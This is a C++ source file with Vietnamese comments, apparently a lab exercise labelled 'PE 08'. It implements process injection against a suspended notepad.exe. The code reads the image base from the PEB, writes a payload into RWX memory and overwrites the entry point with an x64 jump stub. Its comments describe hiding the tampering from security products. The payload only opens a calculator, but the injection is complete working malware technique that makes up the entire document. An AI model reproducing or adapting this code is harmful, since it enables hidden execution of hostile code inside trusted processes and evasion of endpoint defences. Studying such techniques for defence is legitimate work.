#include <windows.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// Hàm chức năng độc lập vị trí sẽ gánh luồng chạy inside lòng tiến trình vỏ bọc
DWORD WINAPI RemoteHollowedPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Gọi bằng địa chỉ tuyệt đối, bẻ gãy hoàn toàn lỗi nhảy tương đối RIP
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    // Giữ luồng sống độc lập inside lòng tiến trình vỏ bọc
    while (TRUE) {
        Sleep(1000);
    }
    return 0;
}

// Giải thuật chủ động định vị đường dẫn hệ thống chuẩn chỉ (Zero Static Buffers)
std::wstring GetActiveTargetBuffer(const std::wstring& exeName) {
    // Bước 1: Gọi truyền NULL để OS tự tính toán kích thước vùng nhớ cần thiết
    UINT requiredSize = GetSystemDirectoryW(NULL, 0);
    if (requiredSize == 0) return L"";

    // Bước 2: Cấp phát động mảng động vừa khít đến từng byte
    std::vector<wchar_t> systemDirBuf(requiredSize);
    if (GetSystemDirectoryW(systemDirBuf.data(), requiredSize) == 0) return L"";

    std::wstring finalPath(systemDirBuf.data());
    finalPath += L"\\" + exeName; // Ghép toán học chuỗi tên tiến trình mục tiêu
    return finalPath;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 08: PROCESS HOLLOWING ACTIVE PATH (CALC.EXE)" << std::endl;
    std::cout << "====================================================" << std::endl;

    // CHỦ ĐỘNG: Tự động tra cứu bản đồ thư mục hệ thống thực tế thay vì gán cứng
    std::wstring targetProcessName = L"notepad.exe";
    std::wstring activeSysPath = GetActiveTargetBuffer(targetProcessName);

    if (activeSysPath.empty()) {
        std::cerr << "[-] Khong the chu dong dinh vi duong dan he thong!" << std::endl;
        return EXIT_FAILURE;
    }
    std::wcout << L"[+] Da chu dong xac dinh duong dan vo boc: " << activeSysPath << std::endl;

    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(STARTUPINFOW);

    // ─── BƯỚC 1: KHỞI TẠO TIẾN TRÌNH VỎ BỌC Ở TRẠNG THÁI ĐÓNG BĂNG HỢP PHÁP ───
    std::cout << "[*] Dang khoi tao tien trinh vo boc o trang thai dong bang..." << std::endl;
    BOOL success = CreateProcessW(
        NULL,
        const_cast<LPWSTR>(activeSysPath.c_str()), // Nạp chuỗi đường dẫn chủ động
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED, // Giữ luồng chính ngay tại vạch xuất phát hệ thống
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!success) {
        std::cerr << "[-] Failed to create suspended process. Error: " << GetLastError() << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }
    std::cout << "[+] Tien trinh vo boc duoc tao voi PID: " << pi.dwProcessId << std::endl;

    // ─── BƯỚC 2: TRÍCH XUẤT NGỮ CẢNH THANH GHI VÀ TÌM TOẠ ĐỘ BASE ADDRESS TỪ PEB ───
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &context);

    PVOID baseAddress = NULL;
    // Trên kiến trúc x64, thanh ghi Rdx chứa địa chỉ cấu trúc PEB, offset +0x10 trỏ tới ImageBaseAddress
    ReadProcessMemory(pi.hProcess, (PVOID)(context.Rdx + 0x10), &baseAddress, sizeof(PVOID), NULL);
    std::cout << "[+] Toa do Base Address goc cua vo boc: 0x" << std::hex << baseAddress << std::endl;

    // ─── BƯỚC 3: GIẢI PHẪU PE HEADERS TỪ XA ĐỂ ĐỊNH VỊ CHÍNH XÁC ENTRYPOINT ───
    BYTE peHeaderBuf[4096];
    if (!ReadProcessMemory(pi.hProcess, baseAddress, peHeaderBuf, sizeof(peHeaderBuf), NULL)) {
        std::cerr << "[-] Khong the doc PE Header tu xa!" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return EXIT_FAILURE;
    }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)peHeaderBuf;
    // ĐỒNG BỘ X64: Ép kiểu rõ ràng về PIMAGE_NT_HEADERS64 để ánh xạ bộ nhớ chính xác tuyệt đối
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((DWORD_PTR)peHeaderBuf + dosHeader->e_lfanew);

    PVOID remoteEntryPoint = (PVOID)((DWORD_PTR)baseAddress + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    std::cout << "[+] Toa do EntryPoint hop phap san co cua Notepad: 0x" << std::hex << remoteEntryPoint << std::endl;

    SIZE_T functionSize = 500;

    // ─── BƯỚC 4: CẤP PHÁT PHÂN VÙNG MÃ MÁY VÀ THAM SỐ TUYỆT ĐỐI TỪ XA ───
    LPVOID remoteCodeBuffer = VirtualAllocEx(pi.hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(pi.hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!remoteCodeBuffer || !pRemoteData) {
        std::cerr << "[-] Cap phat bo nho vung payload tu xa that bai!" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Vung nho Code RWX cua payload dat tai: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // ─── BƯỚC 5: KHỞI TẠO CON TRỎ TUYỆT ĐỐI VÀ ĐẨY LOGIC HÀM SANG RAM NOTEPAD ───
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    WriteProcessMemory(pi.hProcess, remoteCodeBuffer, (LPVOID)RemoteHollowedPayload, functionSize, NULL);
    WriteProcessMemory(pi.hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);

    // ─── BƯỚC 6: ĐỘT PHÁ CƠ CHẾ VÁ LỆNH TẠI ENTRYPOINT GỐC HỢP PHÁP ───
    DWORD oldProtect = 0;
    if (VirtualProtectEx(pi.hProcess, remoteEntryPoint, 32, PAGE_EXECUTE_READWRITE, &oldProtect)) {

        // Mã máy lệnh nhảy tuyệt đối x64 bẻ hướng dòng chảy CPU đâm thẳng vào Payload của ta
        unsigned char jmpStub[] = {
            0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rcx, 0x0 (Địa chỉ nạp cấu trúc dữ liệu tham số)
            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, 0x0 (Địa chỉ nạp vùng thực thi Code)
            0xFF, 0xE0                                                  // jmp rax
        };

        // Vá tọa độ tuyệt đối chính xác vào thân mìn điều hướng
        *(DWORD_PTR*)(jmpStub + 2) = (DWORD_PTR)pRemoteData;
        *(DWORD_PTR*)(jmpStub + 12) = (DWORD_PTR)remoteCodeBuffer;

        // Ghi đè trực tiếp mìn điều hướng vào EntryPoint hợp pháp đang sống của Notepad
        WriteProcessMemory(pi.hProcess, remoteEntryPoint, jmpStub, sizeof(jmpStub), NULL);

        // Phục hồi lại quyền bảo vệ trang nhớ nguyên bản để xóa sạch dấu vết can thiệp của giải pháp an ninh
        VirtualProtectEx(pi.hProcess, remoteEntryPoint, 32, oldProtect, &oldProtect);
        std::cout << "[+] Nap va thiet lap JMP Stub be huong tai EntryPoint hop phap hoan tat!" << std::endl;
    }
    else {
        std::cerr << "[-] Lat quyen EntryPoint de ghi de that bai! Error: " << GetLastError() << std::endl;
    }

    // ── GÀI ĐIỂM DỪNG CHIẾN LƯỢC TẠI ĐÂY ĐỂ ĐÍNH KÈM DEBUGGER ──
    std::cout << "\n[*] PAUSE: Notepad is currently FROZEN in memory." << std::endl;
    std::cout << "[*] Open x64dbg NOW, attach to PID: " << std::dec << pi.dwProcessId << std::endl;
    std::cout << "[*] Press Enter HERE only AFTER you have followed EntryPoint in x64dbg..." << std::endl;
    std::cin.get();

    // ─── BƯỚC 7: KÍCH HOẠT RÃ ĐÔNG ĐỂ LUỒNG TỰ ĐỘNG KHAI HỎA CHIẾN DỊCH ───
    std::cout << "[*] Kich hoat ra dong (ResumeThread) de luong tu dong kich no APC..." << std::endl;
    ResumeThread(pi.hThread);
}